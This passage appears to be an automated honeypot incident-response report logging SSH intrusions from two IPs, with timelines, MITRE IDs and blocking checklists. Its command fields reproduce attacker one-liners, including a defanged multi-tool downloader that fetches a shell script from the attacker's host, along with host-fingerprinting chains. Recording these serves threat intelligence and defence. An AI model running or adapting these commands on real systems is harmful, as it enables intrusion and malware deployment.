| **Commands Executed** | `cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; (busybox wget hxxp://94.154.43[.]88/ohshit.sh -O ohshit.sh 2>/dev/null || wget hxxp://94.154.43[.]88/ohshit.sh -O ohshit.sh 2>/dev/null || curl hxxp://94.154.43[.]88/ohshit.sh -o ohshit.sh 2>/dev/null || tftp 94.154.43[.]88 -c get ohshit.sh 2>/dev/null || tftp -r ohshit.sh -g 94.154.43[.]88 2>/dev/null || busybox ftpget -u anonymous -p anonymous 94.154.43[.]88 ohshit1.sh 2>/dev/null || wget fxxp://anonymous:anonymous@94.154.43[.]88/ohshit1.sh -O ohshit.sh 2>/dev/null , busybox wget hxxp://94.154.43[.]88/ohshit.sh -O ohshit.sh 2 > /dev/null, wget hxxp://94.154.43[.]88/ohshit.sh -O ohshit.sh 2 > /dev/null, curl hxxp://94.154.43[.]88/ohshit.sh -o ohshit.sh 2 > /dev/null, tftp 94.154.43[.]88 -c get ohshit.sh 2 > /dev/null` |
| **Download Attempts** | hxxp://94.154.43[.]88/ohshit.sh, hxxp://94.154.43[.]88/ohshit.sh, hxxp://94.154.43[.]88/ohshit.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:42:30` | `cowrie.session.connect` |
| `2026-07-28 13:42:31` | `cowrie.login.success` |
| `2026-07-28 13:42:31` | `cowrie.session.params` |
| `2026-07-28 13:42:31` | `cowrie.command.input` |
| `2026-07-28 13:42:31` | `cowrie.command.input` |
| `2026-07-28 13:42:31` | `cowrie.command.success` |
| `2026-07-28 13:42:31` | `cowrie.command.input` |
| `2026-07-28 13:42:31` | `cowrie.command.input` |
| `2026-07-28 13:42:31` | `cowrie.command.input` |
| `2026-07-28 13:42:31` | `cowrie.command.input` |
| `2026-07-28 13:42:31` | `cowrie.command.input` |
| `2026-07-28 13:42:31` | `cowrie.command.success` |
| `2026-07-28 13:42:31` | `cowrie.command.input` |
| `2026-07-28 13:42:31` | `cowrie.command.input` |
| `2026-07-28 13:42:31` | `cowrie.command.input` |
| `2026-07-28 13:42:31` | `cowrie.session.file_download` |
| `2026-07-28 13:42:31` | `cowrie.session.file_download.failed` |
| `2026-07-28 13:42:31` | `cowrie.session.file_download` |
| `2026-07-28 13:42:31` | `cowrie.session.file_download.failed` |
| `2026-07-28 13:42:31` | `cowrie.session.file_download` |
| `2026-07-28 13:42:31` | `cowrie.session.file_download.failed` |
| `2026-07-28 13:42:32` | `cowrie.log.closed` |
| `2026-07-28 13:42:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]88` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7f0108fad91

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:43 |
| **Last Seen** | 2026-07-28 13:43 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:43:12` | `cowrie.session.connect` |
| `2026-07-28 13:43:13` | `cowrie.client.version` |
| `2026-07-28 13:43:13` | `cowrie.client.kex` |
| `2026-07-28 13:43:16` | `cowrie.login.success` |
| `2026-07-28 13:43:19` | `cowrie.session.params` |
| `2026-07-28 13:43:19` | `cowrie.command.input` |
| `2026-07-28 13:43:19` | `cowrie.command.input` |
| `2026-07-28 13:43:19` | `cowrie.command.input` |
| `2026-07-28 13:43:19` | `cowrie.command.input` |
| `2026-07-28 13:43:19` | `cowrie.command.input` |
| `2026-07-28 13:43:19` | `cowrie.command.success` |
| `2026-07-28 13:43:19` | `cowrie.command.input` |
| `2026-07-28 13:43:19` | `cowrie.command.input` |
| `2026-07-28 13:43:19` | `cowrie.command.input` |
| `2026-07-28 13:43:19` | `cowrie.command.input` |
| `2026-07-28 13:43:20` | `cowrie.log.closed` |
| `2026-07-28 13:43:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d45bead85bae

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:44 |
| **Last Seen** | 2026-07-28 13:44 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:44:25` | `cowrie.session.connect` |
| `2026-07-28 13:44:26` | `cowrie.client.version` |
| `2026-07-28 13:44:26` | `cowrie.client.kex` |
| `2026-07-28 13:44:29` | `cowrie.login.success` |
| `2026-07-28 13:44:32` | `cowrie.session.params` |
| `2026-07-28 13:44:32` | `cowrie.command.input` |
| `2026-07-28 13:44:32` | `cowrie.command.input` |
| `2026-07-28 13:44:32` | `cowrie.command.input` |
| `2026-07-28 13:44:32` | `cowrie.command.input` |
| `2026-07-28 13:44:32` | `cowrie.command.input` |
| `2026-07-28 13:44:32` | `cowrie.command.success` |
| `2026-07-28 13:44:32` | `cowrie.command.input` |
| `2026-07-28 13:44:32` | `cowrie.command.input` |
| `2026-07-28 13:44:32` | `cowrie.command.input` |
| `2026-07-28 13:44:32` | `cowrie.command.input` |
| `2026-07-28 13:44:32` | `cowrie.log.closed` |
| `2026-07-28 13:44:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76ce1069f7ef

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:45 |
| **Last Seen** | 2026-07-28 13:45 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:45:36` | `cowrie.session.connect` |
| `2026-07-28 13:45:37` | `cowrie.client.version` |
| `2026-07-28 13:45:37` | `cowrie.client.kex` |
| `2026-07-28 13:45:41` | `cowrie.login.success` |
| `2026-07-28 13:45:43` | `cowrie.session.params` |
| `2026-07-28 13:45:43` | `cowrie.command.input` |
| `2026-07-28 13:45:43` | `cowrie.command.input` |
| `2026-07-28 13:45:43` | `cowrie.command.input` |
| `2026-07-28 13:45:43` | `cowrie.command.input` |
| `2026-07-28 13:45:43` | `cowrie.command.input` |
| `2026-07-28 13:45:43` | `cowrie.command.success` |
| `2026-07-28 13:45:43` | `cowrie.command.input` |
| `2026-07-28 13:45:43` | `cowrie.command.input` |
| `2026-07-28 13:45:43` | `cowrie.command.input` |
| `2026-07-28 13:45:43` | `cowrie.command.input` |
| `2026-07-28 13:45:44` | `cowrie.log.closed` |
| `2026-07-28 13:45:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42bcbd14792e

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]88` |
| **First Seen** | 2026-07-28 13:46 |
| **Last Seen** | 2026-07-28 13:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; (busybox wget hxxp://94.154.43[.]88/ohshit.sh -O ohshit.sh 2>/dev/null || wget hxxp://94.154.43[.]88/ohshit.sh -O ohshit.sh 2>/dev/null || curl hxxp://94.154.43[.]88/ohshit.sh -o ohshit.sh 2>/dev/null || tftp 94.154.43[.]88 -c get ohshit.sh 2>/dev/null || tftp -r ohshit.sh -g 94.154.43[.]88 2>/dev/null || busybox ftpget -u anonymous -p anonymous 94.154.43[.]88 ohshit1.sh 2>/dev/null || wget fxxp://anonymous:anonymous@94.154.43[.]88/ohshit1.sh -O ohshit.sh 2>/dev/null , busybox wget hxxp://94.154.43[.]88/ohshit.sh -O ohshit.sh 2 > /dev/null, wget hxxp://94.154.43[.]88/ohshit.sh -O ohshit.sh 2 > /dev/null, curl hxxp://94.154.43[.]88/ohshit.sh -o ohshit.sh 2 > /dev/null, tftp 94.154.43[.]88 -c get ohshit.sh 2 > /dev/null` |
| **Download Attempts** | hxxp://94.154.43[.]88/ohshit.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:46:06` | `cowrie.session.connect` |
| `2026-07-28 13:46:06` | `cowrie.login.success` |
| `2026-07-28 13:46:07` | `cowrie.session.params` |
| `2026-07-28 13:46:07` | `cowrie.command.input` |
| `2026-07-28 13:46:07` | `cowrie.command.input` |
| `2026-07-28 13:46:07` | `cowrie.command.success` |
| `2026-07-28 13:46:07` | `cowrie.command.input` |
| `2026-07-28 13:46:07` | `cowrie.command.input` |
| `2026-07-28 13:46:07` | `cowrie.command.input` |
| `2026-07-28 13:46:07` | `cowrie.command.input` |
| `2026-07-28 13:46:07` | `cowrie.command.input` |
| `2026-07-28 13:46:07` | `cowrie.command.success` |
| `2026-07-28 13:46:07` | `cowrie.command.input` |
| `2026-07-28 13:46:07` | `cowrie.command.input` |
| `2026-07-28 13:46:07` | `cowrie.command.input` |
| `2026-07-28 13:46:07` | `cowrie.session.file_download` |
| `2026-07-28 13:46:07` | `cowrie.session.file_download.failed` |
| `2026-07-28 13:46:07` | `cowrie.log.closed` |
| `2026-07-28 13:46:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]88` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92f170e026cd

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:46 |
| **Last Seen** | 2026-07-28 13:46 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:46:46` | `cowrie.session.connect` |
| `2026-07-28 13:46:47` | `cowrie.client.version` |
| `2026-07-28 13:46:47` | `cowrie.client.kex` |
| `2026-07-28 13:46:51` | `cowrie.login.success` |
| `2026-07-28 13:46:54` | `cowrie.session.params` |
| `2026-07-28 13:46:54` | `cowrie.command.input` |
| `2026-07-28 13:46:54` | `cowrie.command.input` |
| `2026-07-28 13:46:54` | `cowrie.command.input` |
| `2026-07-28 13:46:54` | `cowrie.command.input` |
| `2026-07-28 13:46:54` | `cowrie.command.input` |
| `2026-07-28 13:46:54` | `cowrie.command.success` |
| `2026-07-28 13:46:54` | `cowrie.command.input` |
| `2026-07-28 13:46:54` | `cowrie.command.input` |
| `2026-07-28 13:46:54` | `cowrie.command.input` |
| `2026-07-28 13:46:54` | `cowrie.command.input` |
| `2026-07-28 13:46:55` | `cowrie.log.closed` |
| `2026-07-28 13:46:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00f618bc4116

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]88` |
| **First Seen** | 2026-07-28 13:47 |
| **Last Seen** | 2026-07-28 13:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; (busybox wget hxxp://94.154.43[.]88/ohshit.sh -O ohshit.sh 2>/dev/null || wget hxxp://94.154.43[.]88/ohshit.sh -O ohshit.sh 2>/dev/null || curl hxxp://94.154.43[.]88/ohshit.sh -o ohshit.sh 2>/dev/null || tftp 94.154.43[.]88 -c get ohshit.sh 2>/dev/null || tftp -r ohshit.sh -g 94.154.43[.]88 2>/dev/null || busybox ftpget -u anonymous -p anonymous 94.154.43[.]88 ohshit1.sh 2>/dev/null || wget fxxp://anonymous:anonymous@94.154.43[.]88/ohshit1.sh -O ohshit.sh 2>/dev/null , busybox wget hxxp://94.154.43[.]88/ohshit.sh -O ohshit.sh 2 > /dev/null, wget hxxp://94.154.43[.]88/ohshit.sh -O ohshit.sh 2 > /dev/null, curl hxxp://94.154.43[.]88/ohshit.sh -o ohshit.sh 2 > /dev/null, tftp 94.154.43[.]88 -c get ohshit.sh 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:47:10` | `cowrie.session.connect` |
| `2026-07-28 13:47:11` | `cowrie.login.success` |
| `2026-07-28 13:47:11` | `cowrie.session.params` |
| `2026-07-28 13:47:11` | `cowrie.command.input` |
| `2026-07-28 13:47:11` | `cowrie.command.input` |
| `2026-07-28 13:47:11` | `cowrie.command.success` |
| `2026-07-28 13:47:11` | `cowrie.command.input` |
| `2026-07-28 13:47:11` | `cowrie.command.input` |
| `2026-07-28 13:47:11` | `cowrie.command.input` |
| `2026-07-28 13:47:11` | `cowrie.command.input` |
| `2026-07-28 13:47:11` | `cowrie.command.input` |
| `2026-07-28 13:47:11` | `cowrie.command.success` |
| `2026-07-28 13:47:11` | `cowrie.command.input` |
| `2026-07-28 13:47:11` | `cowrie.command.input` |
| `2026-07-28 13:47:11` | `cowrie.command.input` |
| `2026-07-28 13:47:11` | `cowrie.log.closed` |
| `2026-07-28 13:47:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]88` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec5d45cf96a7

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:47 |
| **Last Seen** | 2026-07-28 13:48 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:47:56` | `cowrie.session.connect` |
| `2026-07-28 13:47:57` | `cowrie.client.version` |
| `2026-07-28 13:47:57` | `cowrie.client.kex` |
| `2026-07-28 13:48:01` | `cowrie.login.success` |
| `2026-07-28 13:48:04` | `cowrie.session.params` |
| `2026-07-28 13:48:04` | `cowrie.command.input` |
| `2026-07-28 13:48:04` | `cowrie.command.input` |
| `2026-07-28 13:48:04` | `cowrie.command.input` |
| `2026-07-28 13:48:04` | `cowrie.command.input` |
| `2026-07-28 13:48:04` | `cowrie.command.input` |
| `2026-07-28 13:48:04` | `cowrie.command.success` |
| `2026-07-28 13:48:04` | `cowrie.command.input` |
| `2026-07-28 13:48:04` | `cowrie.command.input` |
| `2026-07-28 13:48:04` | `cowrie.command.input` |
| `2026-07-28 13:48:04` | `cowrie.command.input` |
| `2026-07-28 13:48:04` | `cowrie.log.closed` |
| `2026-07-28 13:48:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-052d9fa9bc06

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:49 |
| **Last Seen** | 2026-07-28 13:49 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:49:07` | `cowrie.session.connect` |
| `2026-07-28 13:49:08` | `cowrie.client.version` |
| `2026-07-28 13:49:08` | `cowrie.client.kex` |
| `2026-07-28 13:49:12` | `cowrie.login.success` |
| `2026-07-28 13:49:14` | `cowrie.session.params` |
| `2026-07-28 13:49:14` | `cowrie.command.input` |
| `2026-07-28 13:49:14` | `cowrie.command.input` |
| `2026-07-28 13:49:14` | `cowrie.command.input` |
| `2026-07-28 13:49:14` | `cowrie.command.input` |
| `2026-07-28 13:49:14` | `cowrie.command.input` |
| `2026-07-28 13:49:14` | `cowrie.command.success` |
| `2026-07-28 13:49:14` | `cowrie.command.input` |
| `2026-07-28 13:49:14` | `cowrie.command.input` |
| `2026-07-28 13:49:14` | `cowrie.command.input` |
| `2026-07-28 13:49:14` | `cowrie.command.input` |
| `2026-07-28 13:49:15` | `cowrie.log.closed` |
| `2026-07-28 13:49:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34a6d0b75916

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:50 |
| **Last Seen** | 2026-07-28 13:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:50:17` | `cowrie.session.connect` |
| `2026-07-28 13:50:18` | `cowrie.client.version` |
| `2026-07-28 13:50:18` | `cowrie.client.kex` |
| `2026-07-28 13:50:21` | `cowrie.login.success` |
| `2026-07-28 13:50:24` | `cowrie.session.params` |
| `2026-07-28 13:50:24` | `cowrie.command.input` |
| `2026-07-28 13:50:24` | `cowrie.command.input` |
| `2026-07-28 13:50:24` | `cowrie.command.input` |
| `2026-07-28 13:50:24` | `cowrie.command.input` |
| `2026-07-28 13:50:24` | `cowrie.command.input` |
| `2026-07-28 13:50:24` | `cowrie.command.success` |
| `2026-07-28 13:50:24` | `cowrie.command.input` |
| `2026-07-28 13:50:24` | `cowrie.command.input` |
| `2026-07-28 13:50:24` | `cowrie.command.input` |
| `2026-07-28 13:50:24` | `cowrie.command.input` |
| `2026-07-28 13:50:25` | `cowrie.log.closed` |
| `2026-07-28 13:50:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5eb8dba9b8e

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:51 |
| **Last Seen** | 2026-07-28 13:51 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:51:26` | `cowrie.session.connect` |
| `2026-07-28 13:51:27` | `cowrie.client.version` |
| `2026-07-28 13:51:27` | `cowrie.client.kex` |
| `2026-07-28 13:51:29` | `cowrie.login.success` |
| `2026-07-28 13:51:32` | `cowrie.session.params` |
| `2026-07-28 13:51:32` | `cowrie.command.input` |
| `2026-07-28 13:51:32` | `cowrie.command.input` |
| `2026-07-28 13:51:32` | `cowrie.command.input` |
| `2026-07-28 13:51:32` | `cowrie.command.input` |
| `2026-07-28 13:51:32` | `cowrie.command.input` |
| `2026-07-28 13:51:32` | `cowrie.command.success` |
| `2026-07-28 13:51:32` | `cowrie.command.input` |
| `2026-07-28 13:51:32` | `cowrie.command.input` |
| `2026-07-28 13:51:32` | `cowrie.command.input` |
| `2026-07-28 13:51:32` | `cowrie.command.input` |
| `2026-07-28 13:51:33` | `cowrie.log.closed` |
| `2026-07-28 13:51:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4f06211d194

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:52 |
| **Last Seen** | 2026-07-28 13:52 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:52:35` | `cowrie.session.connect` |
| `2026-07-28 13:52:36` | `cowrie.client.version` |
| `2026-07-28 13:52:36` | `cowrie.client.kex` |
| `2026-07-28 13:52:39` | `cowrie.login.success` |
| `2026-07-28 13:52:42` | `cowrie.session.params` |
| `2026-07-28 13:52:42` | `cowrie.command.input` |
